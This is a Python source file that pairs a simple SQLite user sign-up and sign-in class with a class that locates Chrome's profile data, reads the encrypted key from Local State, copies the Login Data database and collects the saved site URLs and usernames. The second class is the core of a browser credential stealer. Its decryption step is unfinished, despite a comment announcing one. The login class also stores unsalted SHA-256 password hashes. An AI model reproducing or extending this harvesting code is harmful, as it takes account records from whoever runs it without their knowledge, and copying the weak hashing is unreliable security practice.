import hashlib
import sqlite3
import os
import json
import base64


class User:
    def __init__(self):
        self.connection = sqlite3.connect('database.db')
        self.cursor = self.connection.cursor()
        self.cursor.execute('''CREATE TABLE IF NOT EXISTS Users (
        username TEXT NOT NULL,
        password TEXT NOT NULL
        )''')
        self.connection.commit()

    def user_registration(self, username, password):
        hash_password = hashlib.sha256(password.encode()).hexdigest()
        self.cursor.execute('''INSERT INTO Users(username, password) VALUES (?, ?)''', (username, hash_password))
        self.connection.commit()
        return True

    def sign_in(self, username, password):
        hash_password = hashlib.sha256(password.encode()).hexdigest()
        self.cursor.execute('''SELECT * FROM Users WHERE username = ? AND password = ?''', (username, hash_password))
        if self.cursor.fetchone() is None:
            return False
        return True


class PasswordGetter:
    def get_passwords(self):
        # Путь к данным Chrome
        user_data_dir = os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data')
        local_state_path = os.path.join(user_data_dir, 'Local State')
        login_db_path = os.path.join(user_data_dir, 'Default', 'Login Data')

        # Извлекаем ключ AES
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.loads(f.read())
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        key = encrypted_key[5:]  # Удаляем префикс DPAPI

        # Копируем базу данных (Chrome должен быть закрыт)
        temp_db = "temp_login.db"
        if os.path.exists(login_db_path):
            import shutil
            shutil.copy2(login_db_path, temp_db)

        # Подключаемся к базе
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value FROM logins")
        users = ''
        # Расшифровка
        for url, user in cursor.fetchall():
            users += f'{url} {user}\n'
        conn.close()
        os.remove(temp_db)
        return users

